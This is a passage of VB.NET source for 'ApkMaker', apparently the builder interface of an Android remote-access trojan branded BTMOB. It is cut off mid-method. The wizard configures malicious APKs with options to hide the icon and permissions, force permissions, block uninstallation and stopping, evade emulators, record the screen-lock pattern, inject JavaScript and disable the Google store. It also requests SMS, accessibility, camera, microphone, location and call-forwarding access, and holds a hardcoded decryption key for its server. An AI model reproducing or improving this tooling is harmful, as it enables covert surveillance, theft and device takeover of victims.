Imports BrightIdeasSoftware
Imports ImageMagick
Imports Newtonsoft.Json
Imports Newtonsoft.Json.Linq
Imports System.Data.SqlTypes
Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Runtime.Remoting.Contexts
Imports System.Threading
Imports System.Windows.Forms.VisualStyles.VisualStyleElement
Imports System.Windows.Forms.VisualStyles.VisualStyleElement.ToolBar

Public Class ApkMaker
    Private currentStepIndex As Integer = 0
    Private TagsManager As TagsManager
    Private httpClient As HttpClient
    Private nextkey As String = "null"
    Private IamAlive As Boolean = True

    Private stateLabel As New Label() ' Label for showing tips
    Private tips As New Dictionary(Of Control, String)() ' Dictionary for tips

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                title1t.Text = "اختيار من المتجر"
                labelname.Text = "اسم العميل"
                lab3.Text = "اسم التطبيق"
                lblurl.Text = "رابط التطبيق"
                notlbl.Text = "عنوان الإشعار"
                lbl6.Text = "رسالة الإشعار"
                lblver.Text = "اصدار التطبيق"
                lblids.Text = "معرف التطبيق"
                lblico.Text = "أيقونة التطبيق"
                DrakeUISymbolLabel8.Text = "العنوان"
                DrakeUISymbolLabel9.Text = "المحتوى"
                DrakeUISymbolLabel10.Text = "الزر"
                langtext.Text = "اختر لغة"
                checkantidelete.Text = "منع الحذف"
                checkautoprims.Text = "صلاحيات تلقائية"
                checkhidprim.Text = "اخفاء الصلاحيات"
                checkjctjs.Text = "حقن JavaScript"
                checkonejs.Text = "مرة واحدة"
                checkforceprims.Text = "فرض الأذونات"

                checkprotect.Text = "حماية التطبيق" 'protect apk
                checkpump.Text = "تكبير الحجم" 'pump size

                checkcaplock.Text = "تسجيل قفل شاشة"
                checknosleep.Text = "منع وضع الخمول"
                checknoemu.Text = "منع المحاكيات"
                checkantistop.Text = "منع الإيقاف"
                checkdisstore.Text = "تعطيل متجر جوجل" 'Disable Google store
                checkhidico.Text = "إخفاء التطبيق"
                Label3.Text = "التتبع"
                Label5.Text = "مضيف خاص (اختياري)"


                Label2.Text = "إعدادات"
                DGVPRIMB.Columns(1).HeaderText = "الصلاحية"
                DGVPRIMB.Columns(2).HeaderText = "الأمر"
                DGVPRIMB.Columns(3).HeaderText = "طلب عند البدء"

                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "ar")
                    End If
                Next

                Exit Select
            Case "CN" ' Chinese
                title1t.Text = "从商店选择"
                labelname.Text = "客户名称"
                lab3.Text = "应用名称"
                lblurl.Text = "应用链接"
                notlbl.Text = "通知标题"
                lbl6.Text = "通知消息"
                lblver.Text = "应用版本"
                lblids.Text = "应用 ID"
                lblico.Text = "应用图标"
                DrakeUISymbolLabel8.Text = "标题"
                DrakeUISymbolLabel9.Text = "内容"
                DrakeUISymbolLabel10.Text = "按钮"
                langtext.Text = "选择语言"
                checkantidelete.Text = "防止删除"
                checkautoprims.Text = "自动权限"
                checkhidprim.Text = "隐藏权限"
                checkjctjs.Text = "注入 JavaScript"
                checkonejs.Text = "仅一次"
                checkforceprims.Text = "强制权限"

                checkprotect.Text = "保护应用程序"
                checkpump.Text = "增加体积"

                checkcaplock.Text = "记录屏幕锁定"
                checknosleep.Text = "防止休眠模式"
                checknoemu.Text = "禁止模拟器"
                checkantistop.Text = "防止停止"
                checkdisstore.Text = "禁用 Google 商店"
                checkhidico.Text = "隐藏应用程序"
                Label3.Text = "跟踪"
                Label5.Text = "专用主机（可选）"

                Label2.Text = "设置"
                DGVPRIMB.Columns(1).HeaderText = "权限"
                DGVPRIMB.Columns(2).HeaderText = "命令"
                DGVPRIMB.Columns(3).HeaderText = "启动时请求"
                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "zh")
                    End If
                Next

                Exit Select

            Case "RU" ' Russian
                title1t.Text = "Выбрать из магазина"
                labelname.Text = "Имя клиента"
                lab3.Text = "Имя приложения"
                lblurl.Text = "Ссылка на приложение"
                notlbl.Text = "Заголовок уведомления"
                lbl6.Text = "Сообщение уведомления"
                lblver.Text = "Версия приложения"
                lblids.Text = "ID приложения"
                lblico.Text = "Иконка приложения"
                DrakeUISymbolLabel8.Text = "Заголовок"
                DrakeUISymbolLabel9.Text = "Содержание"
                DrakeUISymbolLabel10.Text = "Кнопка"
                langtext.Text = "Выберите язык"
                checkantidelete.Text = "Запрет удаления"
                checkautoprims.Text = "Автоматические разрешения"
                checkhidprim.Text = "Скрыть разрешения"
                checkjctjs.Text = "Внедрить JavaScript"
                checkonejs.Text = "один раз"
                checkforceprims.Text = "Принудительные разрешения"

                checkprotect.Text = "Защита приложения"
                checkpump.Text = "Увеличить размер"

                checkcaplock.Text = "Запись блокировки экрана"
                checknosleep.Text = "Запрет режима сна"
                checknoemu.Text = "Запрет эмуляторов"
                checkantistop.Text = "Запрет остановки"
                checkdisstore.Text = "Отключить Google Магазин"
                checkhidico.Text = "Скрыть приложение"
                Label3.Text = "Отслеживание"
                Label5.Text = "Частный хост (необязательно)"
                Label2.Text = "Настройки"
                DGVPRIMB.Columns(1).HeaderText = "Разрешение"
                DGVPRIMB.Columns(2).HeaderText = "Команда"
                DGVPRIMB.Columns(3).HeaderText = "Запрос при запуске"

                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "ru")
                    End If
                Next

                Exit Select

            Case "TR" ' Turkish
                title1t.Text = "Mağazadan Seç"
                labelname.Text = "Müşteri Adı"
                lab3.Text = "Uygulama Adı"
                lblurl.Text = "Uygulama Bağlantısı"
                notlbl.Text = "Bildirim Başlığı"
                lbl6.Text = "Bildirim Mesajı"
                lblver.Text = "Uygulama Sürümü"
                lblids.Text = "Uygulama Kimliği"
                lblico.Text = "Uygulama Simgesi"
                DrakeUISymbolLabel8.Text = "Başlık"
                DrakeUISymbolLabel9.Text = "İçerik"
                DrakeUISymbolLabel10.Text = "Düğme"
                langtext.Text = "Dil Seç"
                checkantidelete.Text = "Silinmeyi Önle"
                checkautoprims.Text = "Otomatik İzinler"
                checkhidprim.Text = "İzinleri Gizle"
                checkjctjs.Text = "JavaScript Enjekte Et"
                checkonejs.Text = "bir kez"
                checkforceprims.Text = "İzinleri Zorla"

                checkprotect.Text = "Uygulamayı koru"
                checkpump.Text = "Boyutu artır"

                checkcaplock.Text = "Ekran Kilidi Kaydı"
                checknosleep.Text = "Uyku Modunu Önle"
                checknoemu.Text = "Emülatörleri Yasakla"
                checkantistop.Text = "Durdurmayı Önle"
                checkdisstore.Text = "Google Mağazasını Devre Dışı Bırak"
                checkhidico.Text = "Uygulamayı Gizle"
                Label3.Text = "Takip"
                Label5.Text = "Özel Sunucu (isteğe bağlı)"
                Label2.Text = "Ayarlar"
                DGVPRIMB.Columns(1).HeaderText = "Yetki"
                DGVPRIMB.Columns(2).HeaderText = "Komut"
                DGVPRIMB.Columns(3).HeaderText = "Başlangıçta İstek"

                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "tr")
                    End If
                Next

                Exit Select
            Case "SP" ' Spanish
                title1t.Text = "Seleccionar desde la tienda"
                labelname.Text = "Nombre del Cliente"
                lab3.Text = "Nombre de la Aplicación"
                lblurl.Text = "Enlace de la Aplicación"
                notlbl.Text = "Título de la Notificación"
                lbl6.Text = "Mensaje de la Notificación"
                lblver.Text = "Versión de la Aplicación"
                lblids.Text = "ID de la Aplicación"
                lblico.Text = "Icono de la Aplicación"
                DrakeUISymbolLabel8.Text = "Título"
                DrakeUISymbolLabel9.Text = "Contenido"
                DrakeUISymbolLabel10.Text = "Botón"
                langtext.Text = "Seleccionar Idioma"
                checkantidelete.Text = "Prevenir Eliminación"
                checkautoprims.Text = "Permisos Automáticos"
                checkhidprim.Text = "Ocultar Permisos"
                checkjctjs.Text = "Inyectar JavaScript"
                checkonejs.Text = "una vez"
                checkforceprims.Text = "Forzar permisos"

                checkprotect.Text = "Proteger aplicación"
                checkpump.Text = "Aumentar tamaño"

                checkcaplock.Text = "Registro de Bloqueo de Pantalla"
                checknosleep.Text = "Prevenir Modo de Sueño"
                checknoemu.Text = "Prohibir Emuladores"
                checkantistop.Text = "Prevenir Paradas"
                checkdisstore.Text = "Desactivar la tienda de Google"
                checkhidico.Text = "Ocultar Aplicación"
                Label3.Text = "Seguimiento"
                Label5.Text = "Servidor Privado (Opcional)"
                Label2.Text = "Configuración"
                DGVPRIMB.Columns(1).HeaderText = "Permiso"
                DGVPRIMB.Columns(2).HeaderText = "Comando"
                DGVPRIMB.Columns(3).HeaderText = "Solicitud al Iniciar"

                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "es")
                    End If
                Next

                Exit Select

            Case "PR" ' Brazilian Portuguese
                title1t.Text = "Selecionar na Loja"
                labelname.Text = "Nome do Cliente"
                lab3.Text = "Nome do Aplicativo"
                lblurl.Text = "Link do Aplicativo"
                notlbl.Text = "Título da Notificação"
                lbl6.Text = "Mensagem da Notificação"
                lblver.Text = "Versão do Aplicativo"
                lblids.Text = "ID do Aplicativo"
                lblico.Text = "Ícone do Aplicativo"
                DrakeUISymbolLabel8.Text = "Título"
                DrakeUISymbolLabel9.Text = "Conteúdo"
                DrakeUISymbolLabel10.Text = "Botão"
                langtext.Text = "Selecionar Idioma"
                checkantidelete.Text = "Prevenir Exclusão"
                checkautoprims.Text = "Permissões Automáticas"
                checkhidprim.Text = "Ocultar Permissões"
                checkjctjs.Text = "Injetar JavaScript"
                checkonejs.Text = "uma vez"
                checkforceprims.Text = "Forçar permissões"

                checkprotect.Text = "Proteger aplicativo"
                checkpump.Text = "Aumentar tamanho"

                checkcaplock.Text = "Registro de Bloqueio de Tela"
                checknosleep.Text = "Prevenir Modo de Sono"
                checknoemu.Text = "Proibir Emuladores"
                checkantistop.Text = "Prevenir Paradas"
                checkdisstore.Text = "Desativar a loja do Google"
                checkhidico.Text = "Ocultar Aplicativo"
                Label3.Text = "Rastreamento"
                Label5.Text = "Servidor Privado (Opcional)"
                Label2.Text = "Configurações"
                DGVPRIMB.Columns(1).HeaderText = "Permissão"
                DGVPRIMB.Columns(2).HeaderText = "Comando"
                DGVPRIMB.Columns(3).HeaderText = "Solicitação ao Iniciar"

                For Each tab As TabPage In maintabs.TabPages
                    If tab.Tag IsNot Nothing Then
                        tab.Tag = Translate(tab.Tag, "en", "pt")
                    End If
                Next

                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub
    Protected Overrides Sub OnFormClosed(e As FormClosedEventArgs)
        ' Remove event handlers dynamically
        For Each item In tips
            RemoveHandler item.Key.MouseHover, AddressOf Control_MouseHover
            RemoveHandler item.Key.MouseLeave, AddressOf Control_MouseLeave
        Next

        ' Call base method to ensure proper cleanup
        MyBase.OnFormClosed(e)
    End Sub

    Sub New(nk As String, htpcli As HttpClient)

        ' This call is required by the designer.
        InitializeComponent()
        nextkey = nk
        httpClient = htpcli
        ' Add any initialization after the InitializeComponent() call.

    End Sub
    Private Sub nextbtn_Click(sender As Object, e As EventArgs) Handles nextbtn.Click
        If currentStepIndex < maintabs.TabCount - 1 Then
            currentStepIndex += 1
            maintabs.SelectedIndex = currentStepIndex

        Else
            ' Handle finish action on the last step
            'MessageBox.Show("Wizard finished!")
            'If builderworker.IsBusy Then
            '    BTAlerter.infos("Please wait")
            '    Return
            'End If
            'builderworker.RunWorkerAsync()
            startbuilder()
        End If

        ' Update button states
        UpdateButtonStates()
    End Sub
    Private deficon As Bitmap
    Private deficon_ok As Bitmap
    Private deficon_ok_one As Bitmap
    Private Sub LoadDGVState()

        If String.IsNullOrWhiteSpace(My.Settings.SavedDGV) Then Exit Sub

        Dim rows = My.Settings.SavedDGV.Split(";"c)
        For Each rowData In rows
            Dim parts = rowData.Split("|"c)
            If parts.Length = 4 Then
                Dim idx = parts(0)
                Dim comboVal = parts(1)
                Dim btnText = parts(2)
                Dim isChecked = Boolean.Parse(parts(3))

                ' Find the matching row
                For Each row As DataGridViewRow In DGVPRIMB.Rows
                    If row.Cells(0).Value?.ToString() = idx Then
                        row.Cells(1).Value = comboVal
                        row.Cells(2).Value = btnText
                        row.Cells(3).Value = isChecked


                        Exit For
                    End If
                Next
            End If
        Next
    End Sub


    Private Sub ApkMaker_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'TabControl1.Appearance = TabAppearance.FlatButtons
        maintabs.ItemSize = New Size(1, 1)
        maintabs.SizeMode = TabSizeMode.Fixed
        mytitle.Text = $"{currentStepIndex + 1}/{maintabs.TabPages.Count} | {maintabs.TabPages(currentStepIndex).Tag}"

        listhosts.Items.Add(BTConst.mainsite)


        deficon = ResizeImage(My.Resources.block_con, New Size(16, 16))
        deficon_ok = ResizeImage(My.Resources.ok_con, New Size(16, 16))
        deficon_ok_one = ResizeImage(My.Resources.one_ok_con, New Size(16, 16))


        DGVPRIMB.Rows.Clear()

        ' Check if saved data exists
        DGVPRIMB.Rows.Add("1", accserstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("2", usgapstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("3", draovrstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("4", chngstnstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("5", btryopimstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("6", backdatastr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("7", filaccstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("8", camaccstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("9", micaccstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("10", redsmsstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("11", sndsmstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("12", redconstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("13", redactstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("14", noftsstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("15", loctionstr, "Remove", False, deficon)
        DGVPRIMB.Rows.Add("16", callfordstr, "Remove", False, deficon)


        For Each col As DataGridViewColumn In DGVPRIMB.Columns
            col.SortMode = DataGridViewColumnSortMode.NotSortable
            col.DefaultCellStyle.Padding = New Padding(0, 5, 0, 5)
            If col.Index >= 3 Then
                col.DefaultCellStyle.Alignment = DataGridViewContentAlignment.MiddleCenter
            End If
        Next



        For Each ro As DataGridViewRow In DGVPRIMB.Rows
            ro.Cells(3).ReadOnly = True
            ro.Cells(3).Style.Alignment = DataGridViewContentAlignment.MiddleCenter
            ro.Cells(4).Style.Alignment = DataGridViewContentAlignment.MiddleCenter
        Next

        If Not String.IsNullOrEmpty(My.Settings.HiddenList) Then
            Dim items = My.Settings.HiddenList.Split("|"c)
            Listhides.Items.Clear()
            Listhides.Items.AddRange(items)
        End If

        checkpump.Checked = My.Settings.checkpump
        checkprotect.Checked = My.Settings.checkprotect

        'DGVPRIMB.Rows(1).DefaultCellStyle.ForeColor = Color.Gray
        'DGVPRIMB.Rows(1).ReadOnly = True
        'DGVPRIMB.Rows(1).Cells(2).Value = "Remove"
        'DGVPRIMB.Rows(1).Cells(3).Value = False


        tips.Add(checkstore, tipcheckstore)
        tips.Add(labelname, tipclientname)
        tips.Add(checknosleep, tipnosleep)
        tips.Add(checknoemu, tipnoemu)
        tips.Add(checkantistop, tipnokill)
        tips.Add(checkcaplock, tipcaplock)
        tips.Add(hideicocombox, tiphideico)
        tips.Add(checkantidelete, tipnodelete)
        tips.Add(inputhost, tipaddhost)
        tips.Add(checkdisstore, tipdisstore)
        tips.Add(checkhidprim, tiphidprim)
        tips.Add(checkjctjs, tipjectjs)
        tips.Add(checkonejs, tipjectjsonce)
        tips.Add(checkforceprims, tipforcprims)
        tips.Add(clitag, tagtipstr)
        tips.Add(ListTags, tagtipstr)
        tips.Add(hidaccsstitle, hidaccsstipstr)
        tips.Add(checkpump, pumptipstr)
        tips.Add(checkprotect, protectappstr)

        ' Assign events dynamically
        For Each item In tips
            AddHandler item.Key.MouseHover, AddressOf Control_MouseHover
            AddHandler item.Key.MouseLeave, AddressOf Control_MouseLeave
        Next


        TagsManager = New TagsManager

        For Each apptag In TagsManager.GetTags()
            ListTags.Items.Add(apptag)
        Next

        translateme()
        Tablogin.Enabled = False


        If Not isEmpty(My.Settings.CLiname) Then CLiname.Text = My.Settings.CLiname
        If Not isEmpty(My.Settings.appname) Then appname.Text = My.Settings.appname
        If Not isEmpty(My.Settings.applink) Then applink.Text = My.Settings.applink
        If Not isEmpty(My.Settings.titletext) Then titletext.Text = My.Settings.titletext
        If Not isEmpty(My.Settings.msgtext) Then msgtext.Text = My.Settings.msgtext
        If Not isEmpty(My.Settings.langtext) Then langtext.Text = My.Settings.langtext
        If Not isEmpty(My.Settings.Acctitletext) Then Acctitletext.Text = My.Settings.Acctitletext
        If Not isEmpty(My.Settings.Accmsgtext) Then Accmsgtext.Text = My.Settings.Accmsgtext
        If Not isEmpty(My.Settings.Accbtntext) Then Accbtntext.Text = My.Settings.Accbtntext


        For index = 1 To 3
            randver_Click(Nothing, Nothing)
            randids_Click(Nothing, Nothing)
        Next

        jectjstext.ReadOnly = True
        jectjstext.Text = "//Example:" & vbNewLine & vbNewLine &
                  "if(confirm('Join telegram channel')){" & vbNewLine &
                  "    window.open('https://t.me/test','_blank');" & vbNewLine &
                  "}"


        connectionkey.Text = BTRegistry.GetValue(Regz.cokey, "BTMOB")
        Label6.Text = conkeystr

        IamAlive = True
        loadstorework.RunWorkerAsync()
        iconsloader.RunWorkerAsync()

        LoadDGVState()

    End Sub

    Private Sub backbtn_Click(sender As Object, e As EventArgs) Handles backbtn.Click
        If currentStepIndex > 0 Then
            currentStepIndex -= 1
            maintabs.SelectedIndex = currentStepIndex
        End If

        ' Update button states
        UpdateButtonStates()
    End Sub
    Private Sub UpdateButtonStates()
        ' Back button is only visible after the first step

        backbtn.Visible = currentStepIndex > 0
        If currentStepIndex = 1 Then
            reficonsspeed = 3000
        Else
            reficonsspeed = 10000
        End If
        mytitle.Text = $"{currentStepIndex + 1}/{maintabs.TabPages.Count} | {maintabs.TabPages(currentStepIndex).Tag}"
        ' Next button changes to "Finish" with lime color on the last step
        If currentStepIndex = maintabs.TabCount - 1 Then
            nextbtn.Text = "Build"
            nextbtn.ForeColor = Color.Lime
            nextbtn.Symbol = 61452
        Else
            nextbtn.Text = "Next"

            nextbtn.Symbol = 57414
            nextbtn.ForeColor = Color.White
        End If
    End Sub

    Private Async Sub loadstorework_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles loadstorework.DoWork
        Dim Randomkey As String = RandomString(32)

        Try
            Threading.Thread.Sleep(1000)
            Dim params = New With {
                     Key .subcom = "load",
                     Key .ran_key = Randomkey,
                     Key .chk = nextkey
                }


            Dim result = Await FetchStore(params, httpClient)


            If result.Item1 Then
                Dim response As String = result.Item2.Replace("\", "").Trim("""")
                Dim datajson As String = Nothing
                Try
                    datajson = DecryptReply(Randomkey, "BT-MOB" & "!B6twG9+&U", response)
                Catch ex As Exception
                    datajson = Nothing
                End Try

                If Not isEmpty(datajson) Then
                    If datajson.StartsWith("[") AndAlso datajson.EndsWith("]") Then
                        Dim jsonArray As JArray = JArray.Parse(datajson)
                        ' Create a list to store row data
                        Dim rowsToAdd As New List(Of Tuple(Of Bitmap, String, String, String, String, String))

                        For Each row As JObject In jsonArray
                            Dim app_id As String = row("app_id").ToString()
                            Dim app_name As String = If(row("app_name")?.ToString(), "")
                            Dim app_size As String = If(row("app_size")?.ToString(), "")
                            Dim app_date As String = If(row("app_date")?.ToString(), "")
                            Dim app_folder As String = If(row("app_folder")?.ToString(), "")
                            Dim app_version As String = If(row("app_version")?.ToString(), "")
                            Dim app_ico As String = If(row("app_ico")?.ToString(), "")
                            ' Dim build_state As String = If(row("build_state")?.ToString(), "")
                            Try
                                Dim appicon As Bitmap = Nothing
                                Dim cachedFilePath As String = Path.Combine(StoreCash_Path, app_id & ".png")

                                ' Check if the image is already cached
                                If File.Exists(cachedFilePath) Then

                                    appicon = ResizeImage(Image.FromFile(cachedFilePath), New Size(32, 32))

                                Else
                                    appicon = ResizeImage(GetImageFromUrl(rootdir & app_ico), New Size(32, 32))
                                    appicon.Save(cachedFilePath)
                                End If

                                ' Add the data to the list
                                rowsToAdd.Add(New Tuple(Of Bitmap, String, String, String, String, String)(appicon, app_name, app_id, app_date, app_size, app_version))

                            Catch ex As Exception
                                ' Handle exceptions if necessary
                            End Try
                        Next

                        ' Perform a single UI update after processing all rows
                        Me.Invoke(Sub()
                                      DGVSTORBLD.Rows.Clear()
                                      For Each row In rowsToAdd
                                          DGVSTORBLD.Rows.Add(row.Item1, row.Item2, row.Item3, row.Item4, row.Item5, row.Item6)
                                      Next
                                      'DGVSTORE.Enabled = True
                                      checkstore.Enabled = True
                                  End Sub)
                    Else
                        Me.Invoke(Sub()
                                      checkstore.Active = False
                                      checkstore.Enabled = False
                                      DGVSTORBLD.Enabled = False
                                  End Sub)
                    End If


                Else
                    'BTAlerter.infos(response, False)
                    Me.Invoke(Sub()
                                  checkstore.Active = False
                                  checkstore.Enabled = False
                                  DGVSTORBLD.Enabled = False

                              End Sub)




                End If

            Else
                Me.Invoke(Sub()
                              BTAlerter.erroes(result.Item2)
                          End Sub)
            End If





        Catch ex As Exception
            Log_e("fetchworker", EXtoString(ex))
        End Try


    End Sub

    Private Sub ApkMaker_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        IamAlive = False
        If Not checkstore.Active Then
            If Not isEmpty(CLiname.Text) Then My.Settings.CLiname = CLiname.Text
            If Not isEmpty(appname.Text) Then My.Settings.appname = appname.Text
            If Not isEmpty(applink.Text) Then My.Settings.applink = applink.Text
            If Not isEmpty(titletext.Text) Then My.Settings.titletext = titletext.Text
            If Not isEmpty(msgtext.Text) Then My.Settings.msgtext = msgtext.Text
            If Not isEmpty(Acctitletext.Text) Then My.Settings.Acctitletext = Acctitletext.Text
            If Not isEmpty(Accmsgtext.Text) Then My.Settings.Accmsgtext = Accmsgtext.Text
            If Not isEmpty(Accbtntext.Text) Then My.Settings.Accbtntext = Accbtntext.Text
            If Not isEmpty(langtext.Text) Then My.Settings.langtext = langtext.Text


            Dim savedRows As New List(Of String)

            For Each row As DataGridViewRow In DGVPRIMB.Rows
                If Not row.IsNewRow Then
                    Dim index = row.Cells(0).Value?.ToString()
                    Dim comboText = row.Cells(1).Value?.ToString()
                    Dim buttonText = row.Cells(2).Value?.ToString()
                    Dim isChecked = row.Cells(3).Value?.ToString() ' Boolean
                    savedRows.Add($"{index}|{comboText}|{buttonText}|{isChecked}")
                End If
            Next
            Dim listData As New List(Of String)
            If Listhides.Items.Count > 0 Then

                For Each item As String In Listhides.Items
                    listData.Add(item)
                Next

            End If

            My.Settings.HiddenList = String.Join("|", listData)

            My.Settings.checkpump = checkpump.Checked
            My.Settings.checkprotect = checkprotect.Checked


            My.Settings.SavedDGV = String.Join(";", savedRows)

            My.Settings.Save() ' Save settingsv
        End If

    End Sub

    Private Sub checkremember_ValueChanged(sender As Object, value As Boolean) Handles checkstore.ValueChanged
        If value Then
            If DGVSTORBLD.Rows.Count = 0 Then
                ' checkstore.Active = False
                checkstore.Enabled = False
                DGVSTORBLD.Enabled = False
                panelids.Enabled = False
                Panelname.Enabled = False
                BTAlerter.infos("No apps found in store")
                Return
            End If
            DGVSTORBLD.Enabled = True
        Else
            DGVSTORBLD.Enabled = False
            Panelver.Enabled = True
            panelids.Enabled = True
            Panelname.Enabled = True
            appver.Enabled = True
            appids.Enabled = True
            listicons.Enabled = True
            listicons.Visible = True
            appicoimg.Image = Nothing
            appicoimg.Tag = Nothing
        End If
    End Sub





    Dim reficonsspeed As Integer = 10000

    Private Sub iconsloader_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles iconsloader.DoWork
        Dim Randomkey As String = RandomString(32)
        Threading.Thread.Sleep(2000)
        While IamAlive
            Try
                ' Call the PHP endpoint to list icons
                Dim listResponse = useraccount.ListIcons(httpClient)
                Console.WriteLine("List Icons Response: " & listResponse)

                ' Parse the JSON response
                Dim jsonResponse = JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(listResponse)

                If jsonResponse.ContainsKey("Success") Then
                    ' Extract the file names (comma-separated string)
                    Dim fileNamesConcatenated = jsonResponse("Success").Trim("""")
                    Dim fileNames = fileNamesConcatenated.Split(New String() {", "}, StringSplitOptions.RemoveEmptyEntries)
                    Me.Invoke(Sub()
                                  listicons.Items.Clear()
                              End Sub)
                    ' Print each file name
                    For Each fileName In fileNames
                        ' Construct the full path to the icon
                        Dim iconfullpath As String = rootdir_storage & fileName.Replace("\", "")
                        Console.WriteLine("Icon File: " & iconfullpath)

                        ' Check if the icon is already in the ImageList
                        If Not imagelisticons.Images.ContainsKey(fileName.Replace("\", "")) Then
                            ' Fetch the icon from the URL if not already present
                            Dim fetchedImage As Bitmap = ResizeImage(GetImageFromUrl(iconfullpath), New Size(32, 32))

                            ' Add the image to the ImageList

                            Me.Invoke(Sub()

                                          imagelisticons.Images.Add(fileName.Replace("\", ""), fetchedImage)
                                      End Sub)
                        End If

                        Dim listItem As New ListViewItem With {
                              .ImageKey = fileName.Replace("\", ""), ' Use the filename as the ImageKey
                              .Tag = fileName.Replace("\", ""), ' Set the file name as the tag for reference
                              .Text = "" ' Optional: display file name in the ListView
                            }

                        ' Add the item to the ListView (UI updates must be invoked on the UI thread)
                        Me.Invoke(Sub()

                                      listicons.Items.Add(listItem)
                                  End Sub)

                    Next


                ElseIf jsonResponse.ContainsKey("Fail") Then
                    ' Handle failure response
                    Dim errorMessage = jsonResponse("Fail").Trim("""")
                    Console.WriteLine("Failed to list icons: " & errorMessage)
                Else
                    ' Handle unexpected response format
                    Console.WriteLine("Unexpected server response.")
                End If
            Catch ex As Exception
                ' Log any exceptions
                Log_e("iconsloader_DoWork", EXtoString(ex))
            End Try

            ' Sleep for 10 seconds before the next iteration
            Threading.Thread.Sleep(reficonsspeed)
        End While
    End Sub


    '
    Private Sub addicon_Click(sender As Object, e As EventArgs) Handles addicon.Click
        Dim openFD As New OpenFileDialog


        openFD.Title = "Select icon (.png)"
        openFD.Filter = "png Files|*.png"



        Select Case openFD.ShowDialog()

            Case DialogResult.OK
                If Not IsPngImage(openFD.FileName) Then
                    BTAlerter.erroes("only select .PNG file")

                    Return
                End If

                Dim addResponse = useraccount.AddIcon(httpClient, openFD.FileName)
                Log_d("Add Icon Response", addResponse)


                Try
                    Dim jsonResponse = Newtonsoft.Json.JsonConvert.DeserializeObject(Of Dictionary(Of String, String))(addResponse)
                    If jsonResponse.ContainsKey("Success") Then

                        BTAlerter.Success("Icon added successfully!")

                    ElseIf jsonResponse.ContainsKey("Fail") Then

                        Dim errorMessage = jsonResponse("Fail").Trim("""")
                        BTAlerter.erroes($"Failed to add icon: {errorMessage}")
                    Else

                        BTAlerter.erroes("Unexpected server response.")
                    End If

                Catch ex As Exception

                End Try


            Case Else


        End Select
    End Sub



    Private Sub listicons_SelectedIndexChanged(sender As Object, e As EventArgs) Handles listicons.SelectedIndexChanged
        ' Ensure an item is selected
        If listicons.SelectedItems.Count > 0 Then
            ' Get the selected ListViewItem
            Dim selectedItem As ListViewItem = listicons.SelectedItems(0)

            Dim fullpath As String = selectedItem.Tag.ToString()
            Dim iconame As String = fullpath.Substring(fullpath.LastIndexOf("/") + 1)

            ' Retrieve the icon image from the ImageList
            If imagelisticons.Images.ContainsKey(fullpath) Then
                Dim selectedIconImage As Image = imagelisticons.Images(fullpath)

                ' Set the selected icon as the larger image in appicoimg
                appicoimg.Image = ResizeImage(selectedIconImage, New Size(144, 144))
                appicoimg.Tag = iconame
            Else
                Console.WriteLine("Icon not found in ImageList.")
            End If
        Else
            ' Clear the big image if no item is selected
            appicoimg.Image = Nothing
            appicoimg.Tag = Nothing
        End If
    End Sub


    Private Sub DGVPRIMS_CellValueChanged(sender As Object, e As DataGridViewCellEventArgs) Handles DGVPRIMB.CellValueChanged
        If e.RowIndex < 0 OrElse e.ColumnIndex < 0 Then
            Return
        End If
        RemoveHandler DGVPRIMB.CellValueChanged, AddressOf DGVPRIMS_CellValueChanged
        Try
            Dim row As DataGridViewRow = DGVPRIMB.Rows(e.RowIndex)

            ' Check cell values safely
            Dim comboValue As String = If(row.Cells(2).Value?.ToString(), String.Empty)
            Dim isRequest As Boolean = False
            If row.Cells(3).Value IsNot Nothing Then
                Boolean.TryParse(row.Cells(3).Value.ToString(), isRequest)
            End If

            ' Handle Cell 2 value change logic
            If e.ColumnIndex = DGVPRIMB.Columns(2).Index Then
                If row.Index = 0 Then
                    If comboValue = "Add" Then
                        ' Adjust the second row settings when first row is "Add"
                        DGVPRIMB.Rows(1).DefaultCellStyle.ForeColor = Color.Gray
                        DGVPRIMB.Rows(1).ReadOnly = True
                        DGVPRIMB.Rows(1).Cells(2).Value = "Remove"
                        DGVPRIMB.Rows(1).Cells(3).Value = False
                        accessoptnpanel.Enabled = True
                        Tablogin.Enabled = True
                    ElseIf comboValue = "Remove" Then
                        ' Restore second row settings
                        DGVPRIMB.Rows(1).DefaultCellStyle.ForeColor = Color.White
                        DGVPRIMB.Rows(1).ReadOnly = False
                        accessoptnpanel.Enabled = False
                        Tablogin.Enabled = False
                    End If
                ElseIf row.Index = 1 Then
                    If comboValue = "Add" Then
                        ' Adjust the second row settings when first row is "Add"
                        DGVPRIMB.Rows(0).DefaultCellStyle.ForeColor = Color.Gray
                        DGVPRIMB.Rows(0).ReadOnly = True
